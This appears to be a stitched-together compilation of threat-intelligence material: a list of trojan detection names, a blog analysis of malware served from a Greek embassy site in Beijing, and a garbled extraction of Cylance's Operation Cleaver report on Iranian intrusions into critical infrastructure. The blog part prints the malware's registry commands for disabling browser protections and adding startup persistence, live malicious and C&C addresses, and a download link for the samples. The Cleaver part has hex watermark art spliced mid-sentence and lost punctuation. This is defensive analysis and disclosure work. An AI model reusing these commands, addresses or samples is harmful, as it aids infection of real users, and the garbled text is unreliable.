Trojan-Spy.Win32.Agent.ctlg
Trojan-Spy.Win32.Agent.ctpd
Trojan-Spy.Win32.Agent.ctps
Trojan-Spy.Win32.Agent.ctpq
Trojan-Spy.Win32.Agent.ctpy
Trojan-Spy.Win32.Agent.ctie
Trojan-Spy.Win32.Agent.ctcz
Trojan-Spy.Win32.Agent.ctgz
Trojan-Spy.Win32.Agent.ctpr
Trojan-Spy.Win32.Agent.ctdp
Trojan-Spy.Win32.Agent.ctdr
Trojan.Win32.Agent.idso
Trojan.Win32.Agent.idrx
HEUR:Trojan.Linux.Cloudatlas.a
Trojan.AndroidOS.Cloudatlas.a
Trojan.IphoneOS.Cloudatlas.a
Parallel research:
     Blue Coat Exposes Inception Framework
#9 Blitzanalysis: Embassy of Greece Beijing - Compromise
It's friday afternoon, I had a bit of free time and stumbled across this tweet by PhysicalDrive0 (thx!) two
hours ago and thought to give it a try to finally add a new article to this Blog (first of 2014):
https://twitter.com/PhysicalDrive0/status/479921770838102017
So, I went to Google to search for the domain of the Embassy of Greece Beijing and added the (allegedly)
malicious java file package that was found by PhysicalDrive0:
URL: http://www.grpressbeijing.com/1.jar (malicious!)
Next, I loaded the 1.jar file into Java Decompiler to get the source code. It showed, that the functionality is
obfuscated in some way, e.g. the function csfn(String paramString) decrypts all strings by "removing" the
numbers of the string parameter:
csfn("64s33333e3333t333S55e666c777u5r333i534t76y2M34a55n76a88g666e44r2222") ->
setSecurityManager
There are some other obfuscation techniques, but they are not important here. Instead, the following
deobfuscated code line in the function init() gives us an idea where the actual payload is located:
Resp localResp = new Resp(csfn("234p34a55445c43654k632434234235")); -> pack
We can also see, that the java package contains a file named pack, so we open 7-Zip and unpack the file. A
quick view with a PE viewer showed, that it is a x86 PE executable not even encrypted (SHA256:
b832e4b5a4829c8df6de7b42c5cb32ef25b5ab59072b4c2a7838404cd0dd5e5f):
                             Figure 2: Payload inside Java package
                             Figure 3: Payload inside PE viewer
So, I opened IDA Pro to take a quick look at the functionality. Together with the strings of the executable,
we get a brief idea of what the purpose of this malware is. The important strings are as follows:
SELECT * FROM AntiVirusProduct
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v PrivDiscUiShown /t
REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v DEPOff /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v DisableFirstRunCustomize /t
REG_DWORD /d 2 /f
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v Check_Associations /t REG_SZ /d no
reg add "HKCU\Software\Microsoft\Internet Explorer\Main"
reg add "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v ShownVerifyBalloon /t
REG_DWORD /d 3 /f
reg add "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v Enabled /t REG_DWORD /d
1 /f
reg add "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v
WarnOnPostRedirect /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v
WarnonZoneCrossing /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Internet Connection Wizard" /v AutoRecover /t REG_DWORD /d
2 /f
reg add "HKCU\Software\Microsoft\Internet Connection Wizard" /v Completed /t REG_BINARY /d 1
\cmd.exe
Together with the output of IDA Pro, we can see that this malware uses the command line tool cmd.exe for
adding several registry keys to Internet Explorer. It also tries to retrieve possible AntiVirus information by
using the COM interface (dc12a687-737f-11cf-884d-00aa004b2e24 -> IWbemLocator -> SELECT *
FROM AntiVirusProduct). Furthermore, it makes use of the COM to launch an instance of Internet
Explorer (d30c1661-cdaf-11d0-8a3e-00c04fc9e26e -> IWebBrowser2), supposedly to contact its C&C
server. To verify this, we open up Wireshark and run the executable. As a result, we get the following
network information:
C&C server: defense.miraclecz.com (IP: 208.115.124.83)
HTTP GET request: /index.asp?id=50100
Also, we see that it downloads some kind of data (Base64 encoded). But first, we combine the C&C server
and the HTTP request and open the URL in our favorite Browser:
                       Figure 4: Base64 encoded (2nd) Payload
URL: defense.miraclecz.com/index.asp?id=50100
As you can see, there is a string named microsoft followed by Base64 encoded data. Side note: Is there
also a Linux equivalent?
Next, we copy the Base64 encoded data and go to the following website to let us decode it into a file
(because I had the feeling it's just another unencrypted executable):
http://www.motobit.com/util/base64-decoder-encoder.asp
As a result, we get another executable (SHA256:
a4863f44f48d1c4c050dd7baad767a86b348dd4d33924acf4e0a3cd40c6ae29f) that was only Base64
encoded and not encrypted in any way:
                             Figure 5: Downloaded Payload
So again, we fire up our PE viewer and take a look at the important strings:
http://buy.miraclecz.com
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v DEPOff /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v DisableFirstRunCustomize /t
REG_DWORD /d 2 /f
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v Check_Associations /t REG_SZ /d no
reg add "HKCU\Software\Microsoft\Internet Explorer\Main"
reg add "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v ShownVerifyBalloon /t
REG_DWORD /d 3 /f
reg add "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v Enabled /t REG_DWORD /d
1 /f
reg add "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v
WarnOnPostRedirect /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v
WarnonZoneCrossing /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Internet Connection Wizard" /v AutoRecover /t REG_DWORD /d
2 /f
reg add "HKCU\Software\Microsoft\Internet Connection Wizard" /v Completed /t REG_BINARY /d 1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v spoolsv.exe /t REG_SZ /d
%%temp%%\spoolsv.exe /f
spoolsv.exe
Software\Microsoft\Windows\CurrentVersion\Run
open file fail
cmd timeout error %d
Run cmd error %d
cmd.exe /c %s>%s
%s%d.txt
open file error
%temp%
%s%s.ini
myWObject
\cmd.exe
!DOCTYPE html
%s/?id1=blank%d&id2=%d%d
%s/?id1=%d%d
Again, we load the executable into IDA Pro and quickly fly over the assembly code to get an idea of the
functionality. Once again, it creates several registry entries with the help of the command line tool and
creates an instance of the Internet Explorer (CoCreateInstance() -> d30c1661-cdaf-11d0-8a3e-
00c04fc9e26e) for contacting the C&C server. This time, the network information is as follows:
C&C server: buy.miraclecz.com (IP: 74.121.191.33)
URL parameters (from strings of executable):
%s/?id1=blank%d&id2=%d%d
%s/?id1=%d%d
From the code we can see, that the sample has also the ability to encode/decode data from/to Base64. The
dynamic analysis showed the malware sample contacted the C&C server, but wasn't sending any URL
parameters (id1, id2). Also the server didn't respond...
The files can be downloaded here:
https://www.dropbox.com/s/ckr7p5kka62cc7s/Embassy%20of%20Greece%20-%20Beijing.zip
Password: "infected" (without "")
That's it, have a nice weekend...
                                     6f20476f6f64
                                   44
                                 20
                             c
                           c2
              c2 b204576696
                            6f20476 f64
                          44
                        20
                6c
              6e
      04576696
                      9
                                    86
                                 546
   6b2
                           86
                        546
                                                    #OPCLEAVER
                                                                                                                           476f6f64
                                                                                                                       6f20
                                                                                                                     44
OPERATION
                                                                                                                   20
                                                                                                                   2c
                                                                                                        b204576696c
CLEAVER
                                                                                                      e6
                                                                                                    96
                                                                                                                      86
                                                                                                                   546
       
Iran should be considered a first-tier cyber power.
                                              Gabi Siboni
                      Israel Institute for National Security Studies cybersecurity expert
    
Iran has rapidly gained near parity with the Chinese but
       may be closer to the Russians in terms of swagger.
                               Retired Admiral William J. Fallon
                                      Former Commander CENTCOM
Global critical infrastructure organizations need to take this
 threat seriously. The Iranian adversary is real and they
                   coming, if not already here.
                                         Mark Weatherford
        Former Deputy Under Secretary for Cybersecurity at the US Department of Homeland Security
                      
Yes, China and one or two others
                       can shut down our power grids.
                                     Admiral Michael Rogers
                 Director of the National Security Agency and head of US Cyber Command
    
The world has combated cyber threats by doing the same
     thing over and over again 
s the definition of insanity.
                                                Jeff Moss
            Co-Chair DHS Community Resiliency Task Force, Founder of DEFCON and BlackHat
                                Jalal ad-Din Muhammad Rumi
                         13th Century Persian poet, jurist, theologian and Sufi mystic
                            English translation: 
Silence gives answers.
#OPCLEAVER
                        PREVENTION IS EVERYTHING
                                 A personal note from Cylance, CEO Stuart McClure
              n February 24, 1989, United Flight 811 left Honolulu, Hawaii, on its way to Auckland, New Zealand, with
              364 souls on board. Somewhere between 23,000 and 24,000 feet an enormous explosion ejected nine
              passengers into the dark void over the Pacific Ocean.1 This aviation disaster was later determined to have
              been caused by a simple design flaw combined with the lack of corrective action. Boeing and the FAA had
  known about this problem for over one year prior to the accident. The result: nine people lost their lives. The other 337
  passengers plus 18 crew members who survived, live with the memory every day; all of it due to a highly preventable
  design flaw. As a 19-year-old young adult, I was grateful to have survived but I had no idea how that single event would
  impact my future in such a profound way. Much of my passion for cybersecurity can be directly attributed to that
  fateful day.
  The United Flight 811 accident proves just how important it is to detect flaws before tragedy strikes. Preventable
                                       6 f20476 f64
  disasters like this are what motivates the Cylance team to create a safer world. We do everything we can to uncover
                                  4 4
  the flaws in technologies before they damage the physical or cyber world. Our mission is simple: to protect the world.
  This report is an attempt to deliver on that mission.
                              20 and professionally for more than 26 years, there is no doubt in my mind
  After tracking hackers both personally
                                   c
  that the release of the information contained in the Operation Cleaver report is vital to the security of the world
                                 c2
  critical infrastructure.
                         04576696
  The focus of the Operation Cleaver report is on one particular Iranian team we
ve dubbed Tarh Andishan, the
  infrastructure they utilize, as well as their tactics, techniques and procedures. Roughly translated, 
Tarh Andishan
  means 
thinkers
 or 
innovators
. This team displays an evolved skillset and uses a complex infrastructure to perform
  attacks of espionage, theft, and the potential destruction of control systems and networks. While our investigation is
  ongoing, and we presently have limited visibility inside many of the compromised networks, Cylance observed Tarh
  Andishan actively targeting, attacking, and compromising more than 50 victims since at least 2012.
  Cylance is committed to responsible disclosure and has refrained from exaggeration and embellishment in this
                        2
  report, limiting our content to only that which can be definitively confirmed. However, we have speculated on the
                       b
  possible motivations behind these attacks, given our deep knowledge and understanding of the cyber landscape.
                      6
  We have made every effort to notify all affected entities prior to publishing this report. Additionally, all personally
                    6e
  identifiable information about the members of Operation Cleaver has been withheld. We don
t care who the adversary
                   9
  is, where they work or reside, who they
re dating or what party photos they upload to Facebook 
 all we care about is
                                      6
  preventing campaigns like Operation Cleaver from negatively affecting the real world.
                                     8
                                  546
  This report is for the world
s cyber defenders 
 never give up!
  Sincerely,
  Stuart McClure
  CEO/President
  Cylance, Inc.
                                                                                                                           3
                                                                                                                                      476f6f64
                                                                                                                                  6f20
                                                                                                                                44
OPERATION
                                                                                                                              20
                                                                                                                              2c
                                                                                                                   b204576696c
CLEAVER
                                                                                                                 e6
                                                                                                               96
                                                                                                                                 86
                                                                                                                              546
    TABLE OF CONTENTS
    Executive Summary ......................................................................... 5
    Background ........................................................................................ 6
    Why the name 
Cleaver
? ............................................................. 8
    Why Expose Iran Now? .................................................................. 8
    Critical Discoveries ......................................................................... 9
    Targets & Victims ............................................................................ 12
    Attribution ......................................................................................... 17
    
 Attacker IP Addresses .............................................................. 18
    
 Attacker Domains ...................................................................... 19
    
 Tools & Software ........................................................................ 20
    
 Tarh Andishan ............................................................................ 24
    
Members ...................................................................................... 26
      
Teams ............................................................................................ 30
    Tactics, Techniques & Procedures (TTPs) ............................... 31
    
 Initial Compromise ..................................................................... 32
    
 Privilege Escalation & Pivoting ............................................... 36
    
Exfiltration .................................................................................... 41
    
Persistence .................................................................................. 47
    Mitigation .......................................................................................... 60
    Speculation: The Why ................................................................... 62
    Conclusion ........................................................................................ 65
    References ........................................................................................ 67
    About Cylance ................................................................................. 68
    Cylance Products ........................................................................... 69
    Cylance Services ............................................................................ 70
    Acknowledgments ...................................................................... 71
    The Operation Cleaver Logo ...................................................... 72
    Appendix A: Indicators of Compromise (IOC) ........................ 73
#OPCLEAVER
  EXECUTIVE SUMMARY
  Since at least 2012, Iranian actors have directly attacked,
  established persistence in, and extracted highly sensitive
  materials from the networks of government agencies and major
  critical infrastructure companies in the following countries:
  Canada, China, England, France, Germany, India, Israel,
  Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South Korea,
  Turkey, United Arab Emirates, and the United States.
                               6 f20476 f64
  Iran is the new China.     44
                         20 the past several years, conducted a significant global surveillance
  Operation Cleaver has, over
                               c
  and infiltration campaign. To date it has successfully evaded detection by existing security
                             c2
  technologies. The group is believed to work from Tehran, Iran, although auxiliary team
                     04576696
  members were identified in other locations including the Netherlands, Canada, and the UK.
  The group successfully leveraged both publicly available, and customized tools to attack and
  compromise targets around the globe. The targets include military, oil and gas, energy and
  utilities, transportation, airlines, airports, hospitals, telecommunications, technology, education,
  aerospace, Defense Industrial Base (DIB), chemical companies, and governments.
  During intense intelligence gathering over the last 24 months, we observed the technical
                    2
  capabilities of the Operation Cleaver team rapidly evolve faster than any previously observed
                  6b
  Iranian effort. As Iran
s cyber warfare capabilities continue to morph,2 the probability of an attack
                 e
  that could impact the physical world at a national or global level is rapidly increasing.3 Their
                6
  capabilities have advanced beyond simple website defacements, Distributed Denial of Service
               9
  (DDoS) attacks, and Hacking Exposed style techniques.
                                 86
                              546
  With minimal separation between private companies and the Iranian government, their modus
  operandi seems clear: blur the line between legitimate engineering companies and state-
  sponsored cyber hacking teams to establish a foothold in the world
s critical infrastructure.
  Iran
s rising expertise, along with their choice of victims, has compelled us to release this report
  sooner than we would have liked in order to expose Operation Cleaver to the world. The
  evidence and indicators of compromise we provide in this report will allow potentially unaware
  victims to detect and eliminate Cleaver
s incursions into their networks.
                                                                                                          5
                                                                                                                         476f6f64
                                                                                                                     6f20
                                                                                                                   44
OPERATION
                                                                                                                 20
                                                                                                                 2c
                                                                                                      b204576696c
CLEAVER
                                                                                                    e6
                                                                                                  96
                                                                                                                    86
                                                                                                                 546
BACKGROUND
Iran has been severely impacted by debilitating and extremely
advanced malware campaigns since at least 2009. Famous
examples of these efforts include industrial sabotage via
Stuxnet (2009 - 2010), and espionage with Duqu (2009 - 2011)
as well as Flame (2012). These campaigns have targeted Iran
nuclear program, and oil and gas operations. Stuxnet was an
eye-opening event for Iranian authorities, exposing them to the
world of physical destruction via electronic means.
Hacking campaigns sourced out of Iran are nothing new. Since the early 2000
s, the information
security industry as a whole has tracked teams like the Iranian Cyber Army, which mainly focuses
on patriotic hacking (website defacements). After the release of Stuxnet, Iran
s motivations appear
to have shifted. Retaliation for Stuxnet began almost immediately in 2011 with campaigns like the
certificate compromises of Comodo and DigiNotar. These attacks served as a warning, showcasing
the rapid evolution of Iran
s hacking skills.
A major retaliation came in the form of 2012
s Shamoon campaign, which impacted RasGas and
Saudi Aramco. It
s estimated that Shamoon impacted over 30,000 computer endpoints and cost
the affected companies tens-of-thousands of hours recovering from the attacks. The direct financial
impact from this retaliation and amount of downtime experienced were staggering. Shamoon was
truly a watershed event for security defenders. It was the first glimpse into the real capabillity and
intention of Iranian cyber operations. We see the same motivation and intent here in Operation
Cleaver: establishing a beachhead for cyber sabotage.
We saw further Iranian backlash in late 2012 and early 2013 in the form of Operation Ababil
Distributed Denial of Service (DDoS) attacks against US banks. These attacks were debilitating and
impacted the availability of online banking services. Yet more backlash was witnessed with FireEye
exposure of Operation Saffron Rose, an espionage campaign executed by the Ajax Security Team
in 2014. In May 2014, evidence emerged of a highly targeted waterhole attack that leveraged social
media, dubbed Operation Newscaster, which was uncovered by iSight Partners.
In June 2013, Israeli Prime Minister Benjamin Netanyahu accused Iran of carrying out 
non-stop
attacks on 
[Israel
s] vital national systems
 including 
water, power and banking
4. The following
September of 2013, the Wall Street Journal accused Iran of hacking into unclassified U.S. Navy
computers in San Diego
s NMCI (Navy Marine Corp Intranet),5 which we can confirm was part of
Operation Cleaver.
#OPCLEAVER
  While previously reported operations attributed to Iran have largely focused on Defense Industrial
  Base (DIB) companies, the United States Federal Government, or targets in Middle Eastern countries,
  Operation Cleaver has instead focused on a wide array of targets, including energy producers
  and utilities, commercial airlines and airports, military intelligence, aerospace, hospitals, and
  even universities 
 with only ten of the targets based in the United States. Such broad targeting
  demonstrates to the world that Iran is no longer content to retaliate against the US and Israel alone.
  They have bigger intentions: to position themselves to impact critical infrastructure globally.
      ORIGINATION                                                                                                          RETALIATION
                                                               2010
                                       f20476 f64
                                  StUXNEt
                                      6
                                   4 4      2011
                                 20
                                 c
                                   duqu
                               c2
                                    ~
                       04576696
                                                                            DigiNotar
                                                               2012
                              FL ME
                                                                           SHAM                                             N
                                  GAUSS
                      2
                                                                                                     OPERATION
                     b
                                                                                                     Ababil
                   e6
                                                               2013
                  6
                                                                                          NMC
                                                                                          NMC
                                                                                          NMCI
                                                                                            CII
                 9
                                                                                              NAVY MARINE CORPS INTRANET
                                    86
                                                               2014
                                 546
                                                                              Saffr n Rose
                                                                                               NEWSCASTER
                                                                                                 476f6f64
                                                                                             6f20
                                                                                           44
                                                                                         20
                                                                                         2c
                                                                              b204576696c
                                                                            e6
                                                                          96
                                                                                            86
                                                                                         546
           Figure 1: The sequence of major Iran-centric attacks; either as victims (left) or attackers (right).
                                                                                                                                         7
                                                                                                                           476f6f64
                                                                                                                       6f20
                                                                                                                     44
OPERATION
                                                                                                                   20
                                                                                                                   2c
                                                                                                        b204576696c
CLEAVER
                                                                                                      e6
                                                                                                    96
                                                                                                                      86
                                                                                                                   546
 WHY THE NAME CLEAVER?
 The string cleaver is found several times in a variety of custom software used in Operation
 Cleaver, including:
   1   Numerous references inside the namespaces of their custom bot code 
         codenamed TinyZBot, e.g.:
e:\projects\cleaver\trunk\zhoupin_cleaver\obj\x86\release\netscp.pdb
     2   PDBs associated with the hacker name 
Jimbp
, e.g.:
       c:\users\jimbp\desktop\binder_1 - for cleaver\binder_1\obj\x86\release\setup.pdb
     3   PDBs associated with the keystroke loggers, artifacts, and numerous other tools, e.g.:
e:\Projects\Cleaver\trunk\MainModule\obj\Release\MainModule.pdb
 WHY EXPOSE IRAN NOW?
 We believe our visibility into this campaign represents only a fraction of Operation Cleaver
s full
 scope. We believe that if the operation is left to continue unabated, it is only a matter of time
 before the world
s physical safety is impacted by it. While the disclosure of this information will
 be a detriment to our ability to track the activity of this group, it will allow the security industry as
 a whole to defend against this threat. As such, we are exposing this cyber campaign early in an
 attempt to minimize additional real-world impact and prevent further victimization.
CRITICAL DISCOVERIES
                       6f20476f6f64
                     44
                   20
                    c
                  c2
        b204576696
     6e6
    9
                      86
                   546
                                      #OPCLEAVER
                                                                                                                      476f6f64
                                                                                                                  6f20
                                                                                                                44
OPERATION
                                                                                                              20
                                                                                                              2c
                                                                                                   b204576696c
CLEAVER
                                                                                                 e6
                                                                                               96
                                                                                                                 86
                                                                                                              546
 CRITICAL DISCOVERIES
 Iranian Actors Are Behind Operation Cleaver
 Persian hacker names are used throughout the campaign including: Salman Ghazikhani,
    Bahman Mohebbi, Kaj, Parviz, Alireza, and numerous others.
 Numerous domains used in the campaign were registered in Iran.
 Infrastructure leveraged in the attack was registered in Iran to the corporate entity Tarh
    Andishan, which translates to 
invention
 or 
innovation
 in Farsi.
 Source netblocks and ASNs are registered to Iran.
 Hacker tools warn when their external IP address traces back to Iran.
 The infrastructure is hosted through Netafraz.com, an Iranian provider out of Isfahan, Iran.
 The infrastructure utilized in the campaign is too significant to be a lone individual or a small
    group. We believe this work was sponsored by Iran.
 Operation Cleaver Targets Critical Infrastructure Around the World
 US Military targets including NMCI in October 2013.5 Confirmed targeting of global
    government entities.
 Networks and systems targeted in critical industries like energy and utilities, oil and gas, and
    chemical companies.
 Assets (both cyber and physical) and logistics information were compromised at major airline
    operators, airports, and transportation companies.
 Various global telecommunications, technology, healthcare, aerospace, and defense
    companies were breached as part of the operation.
 Confidential critical infrastructure documents were harvested from major educational
    institutions around the world.
 Iran
s Cyber Hacking Skills Have Evolved
 Initial compromise techniques include SQL injection, web attacks, and creative deception-
    based attacks 
 all of which have been implemented in the past by Chinese and Russian
    hacking teams.
 Pivoting and exploitation techniques leveraged existing public exploits for MS08-067 and
    Windows privilege escalations, and were coupled with automated, worm-like propagation
    mechanisms.
 Customized private tools with functions that include ARP poisoning, encryption, credential
    dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and
    SMB communications, network interface sniffing, and keystroke logging.
 The ability to build customized tools to compromise any target they choose.
#OPCLEAVER
 Indicators of Compromise (IOC)
 Private signing certificates of one victim were captured allowing the Operation Cleaver team to
    compromise the entirety of their organization.
 Over the past two years, Cylance has collected over 8GB of data including over 80,000 files of
    exfiltrated data, hacker tools, victim logs, and highly sensitive reconnaissance data.
 Data from sinkholed command and control servers has allowed us to track this active campaign.
 Cylance is releasing more than 150 IOCs and samples associated with the Cleaver campaign to
    empower the security community to detect existing compromises in their own organizations, as
    well as potentially block future attacks from these teams.
 Speculation
                                 6f20476 f64
    This campaign continues Iran
s retaliation for Stuxnet, Duqu, and Flame.
                               44
    This is a state-sponsored campaign.
                          20
    There is a possibility that this campaign could affect airline passenger safety.
    This campaign
s intentions may be to damage Industrial Control Systems (ICS), Supervisory
                              c
                            c2
    Control and Data Acquisition (SCADA) systems, and impact Critical Infrastructure and Key
    Resources (CIKR).
                    04576696
 This campaign could be a way to demonstrate Iran
s cyber capabilities for additional
    geopolitical leverage, due to the breadth and depth of their global targets.
 There is an intense focus on CIKR companies in South Korea, which could give Iran additional
    clout in their burgeoning partnership with North Korea. In September 2012, Iran signed an
    extensive agreement for technology cooperation agreement with North Korea, which would
    allow for collaboration on various efforts including IT and security.6
 Iran is recruiting from within the universities and potentially using 
hackers for hire
                 6b2
               6e
              9
                                86
                             546
                                                                                                   11
TARGETS & VICTIMS
                      6f20476f6f64
                   044
                  2
                   c
                 c2
       b204576696
    6e6
   9
                    686
                  54
                                     #OPCLEAVER
#OPCLEAVER
  TARGETS & VICTIMS
  The Cleaver team targets some of the most sensitive global critical infrastructure companies in the
  world, including military, oil and gas, airlines, airports, energy producers, utilities, transportation,
  healthcare, telecommunications, technology, manufacturing, education, aerospace, Defense
  Industrial Base (DIB), chemical companies and governments. Countries impacted include Canada,
  China, England, France, Germany, India, Israel, Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South
  Korea, Turkey, United Arab Emirates, and the US.
  The following is a breakdown by country of which industries were targeted and/or victimized:
         Canada                       Kuwait                    South Korea
         - Energy & Utilities
                                     6f20476 f64
                                      - Oil & Gas               - Airports
         - Oil & Gas
                                   44 - Telecommunications      - Airlines
                                 20 Mexico
         - Hospitals                                            - Education
                                                                - Technology
                                  c
         China                        - Oil & Gas               - Heavy Manufacturing
                                c2
         - Aerospace
                        04576696
                                      Pakistan                  Turkey
                                      - Airports                - Oil & Gas
         England
         - Education                  - Hospitals
                                      - Technology              United Arab Emirates
         France                       - Airlines                - Government
         - Oil & Gas                                            - Airlines
                       2
                                      Qatar
                      b
         Germany                      - Oil & Gas
                                                                United States
                     6
                                      - Government
                    e
         - Telecommunications                                   - Airlines
                                      - Airlines
                   6
                                                                - Education
                  9
         India                      86                          - Chemicals
         - Education                  Saudi Arabia              - Transportation
                                 546  - Oil & Gas               - Energy & Utilities
                                      - Airports                - Military/Government
         Israel                                                 - Defense Industrial Base
         - Aerospace
         - Education
                                                                                                       13
                                                                                                                        476f6f64
                                                                                                                    6f20
                                                                                                                  44
OPERATION
                                                                                                                20
                                                                                                                2c
                                                                                                     b204576696c
CLEAVER
                                                                                                   e6
                                                                                                 96
                                                                                                                   86
                                                                                                                546
 Cleaver
s level of access into each organization varied greatly, including completely compromised
 systems and networks, Active Directory domain controllers and credentials, compromised data
 repositories and stolen VPN credentials.
 Compromised systems include Microsoft Windows web servers running IIS and ColdFusion,
 Apache with PHP, many variants of Microsoft Windows desktops and servers, and Linux servers.
 Compromised network infrastructure included Cisco VPNs as well as Cisco switches and routers.
 Unlike Stuxnet, no exotic exploitations (such as 0-days) were observed.
 Within our investigation, we had no direct evidence of a successful compromise of specific
 Industrial Control Systems (ICS) or Supervisory Control and Data Acquisition (SCADA) networks, but
 Cleaver did exfiltrate extremely sensitive data from many critical infrastructure companies allowing
 them to directly affect the systems they run. This data could enable them, or affiliated organizations,
 to target and potentially sabotage ICS and SCADA environments with ease.
 We discovered over 50 victims in our investigation, distributed around the globe. Ten of these
 victims are headquartered in the US and include a major airline, a medical university, an energy
 company specializing in natural gas production, an automobile manufacturer, a large defense
 contractor, and a major military installation. The four targets in Israel and the five targets in Pakistan
 are comprised of education, aerospace, airports, airlines, healthcare and technology. Further victims
 were identified in numerous Middle Eastern countries as well as ones in Northern Europe including
 the UK, France, and Germany. Central America was not immune either with a large oil and gas
 company on the list. In fact, oil and gas was a particular focal point for the Cleaver team, going after
 no less than nine of these companies around the world.
 Universities were targeted in the US, India, Israel, and South Korea. The attackers targeted research
 efforts, student information, student housing, and financial aid systems. They had a penchant for
 pictures, passports, and any specifc identifying information.
 Perhaps the most bone-chilling evidence we collected in this campaign was the targeting and
 compromise of transportation networks and systems such as airlines and airports in South Korea,
 Saudi Arabia and Pakistan. The level of access seemed ubiquitous: Active Directory domains
 were fully compromised, along with entire Cisco Edge switches, routers, and internal networking
 infrastructure. Fully compromised VPN credentials meant their entire remote access infrastructure
 and supply chain was under the control of the Cleaver team, allowing permanent persistence
 under compromised credentials. They achieved complete access to airport gates and their security
 control systems, potentially allowing them to spoof gate credentials. They gained access to PayPal
 and Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered
 access to the victim
s domains. We were witnessed a shocking amount of access into the deepest
 parts of these companies and the airports in which they operate.
#OPCLEAVER
                                           COUNTRIES TARGETED
                                                                   4       6
                  1                       2
                                                                                                                            3
                                                                                        B
                                A              A                   5                                        B                     22
                                                                                            B
              A                                A                       7
                                                                                                                B
                  A                                                                                                                   21
                                                                               B                                            23
                                                                                        B         B
                                13                                                                      B
                                    6f20476 f64
                                  44
                                20
                          c
                        c2
                04576696
                                                                                        24                                17 15
                                                    30
                                                                                                                                  8
                                                                                   9
                                                                                                 12                  16
                                                                                                                                           8
                                                                                   10
                                                                                                  11
                      29                                                                                             25
                                     33                  35                                                                  14
                                                                                            20        19 18
                                                              34                                                26
                           28
                                32        31
         27
                                                              A                                                                                B
                                               31
               2
          27
             6b
           6e
                                                   TARGET LOCATIONS
          9
                                   86
       1. Canada - Calgary                     13. Mexico - Mexico City                          25. UAE - Abu Dhabi
       2. Canada - Hamilton     546            14. Pakistan - Karachi (2)                        26. UAE - Al Garhoud
       3. China - Beijing                      15. Pakistan - Lahore                             27. USA - California - Los Angeles (2)
       4. England - Oxford                     16. Pakistan - Multan                             28. USA - California - San Diego
       5. France - Paris                       17. Pakistan - Peshawar                           29. USA - California - San Jose
       6. Germany - Dusseldorf                 18. Qatar - Doha (4)                              30. USA - Michigan - Dearborn
       7. Germany - Frankfurt                  19. Saudi Arabia - Dhahran                        31. USA - Texas - Houston (2)
       8. India - New Delhi (2)                20. Saudi Arabia - Jeddah                         32. USA - Texas - Fort Worth
       9. Israel - Haifa (3)                   21. South Korea - Incheon                         33. USA - Texas - Southlake
       10. Israel - Rehovot                    22. South Korea - Goyang-si                       34. USA - Virginia - Fairfax
       11. Kuwait - Ahmadi                     23. South Korea - Seoul (7)                       35. USA - Virginia - McLean
       12. Kuwait - Kuwait City                24. Turkey - Antalya
     Figure 2: Geographic distribution of victims, as determined by the global headquarters of the parent
     company or organization breached.
                                                                                                                                                   15
                                                                                                                                                                                                             476f6f64
                                                                                                                                                                                                         6f20
                                                                                                                                                                                                       44
OPERATION
                                                                                                                                                                                                     20
                                                                                                                                                                                                     2c
                                                                                                                                                                                          b204576696c
CLEAVER
                                                                                                                                                                                        e6
                                                                                                                                                                                      96
                                                                                                                                                                                                        86
                                                                                                                                                                                                     546
                                                       INDUSTRIES TARGETED
                             HIGH
 LEVEL OF ACCESS
                         MEDIUM
                             LOW
                                             GY
                                                                                                                      S
                                                       E
                                                                N
                                                                                                                                                    AS
                                                                           G
                                                                                     L
                                                                                                                                 N
                                                                                                                      N
                                                                                               LS
                                                                                                                                           T
                                                    AC
                                                                                                         LS
                                                                O
                                                                                                                                                                        S
                                                                                                                                                             ES
                                                                                     IA
                                                                           IN
                                          LO
                                                                                                                               O
                                                                                                                                                                                  S
                                                                                                                      O
                                                                                                                                       EN
                                                                                                                                                    G
                                                                                                                                                                       RT
                                                               I
                                                                                              A
                                                                                                                                                                                 IE
                                                                                    TR
                                                            AT
                                                                      UR
                                                                                                         A
                                                                                                                                 I
                                                                                                                    I
                                                  SP
                                                                                                                              AT
                                                                                                                 AT
                                                                                                                                                         IN
                                         O
                                                                                              IC
                                                                                                                                                   &
                                                                                                                                       M
                                                                                                                                                                             IT
                                                                                                       IT
                                                                                                                                                                   O
                                                           UC
                                                                                US
                                                                                                                                                        RL
                                         N
                                                                       T
                                               RO
                                                                                          EM
                                                                                                                          RT
                                                                                                                                     RN
                                                                                                                 IC
                                                                                                                                                                             IL
                                                                                                    SP
                                                                                                                                               IL
                                                                                                                                                                  RP
                                     CH
                                                                    AC
                                                                                                                                                                            UT
                                                                                                              UN
                                                                                                                                               O
                                                                                                                                                        AI
                                                                                D
                                                       ED
                                                                                                                          O
                                                                                                                                  VE
                                             AE
                                                                                         CH
                                                                                                   O
                                                                                                                                                                  AI
                                                                             IN
                                                                UF
                                    TE
                                                                                                                      SP
                                                                                                   H
                                                                                                             M
                                                                                                                                                                        &
                                                                                                                                 O
                                                                           SE
                                                                                                            M
                                                             AN
                                                                                                                   AN
                                                                                                                                G
                                                                                                                                                                       GY
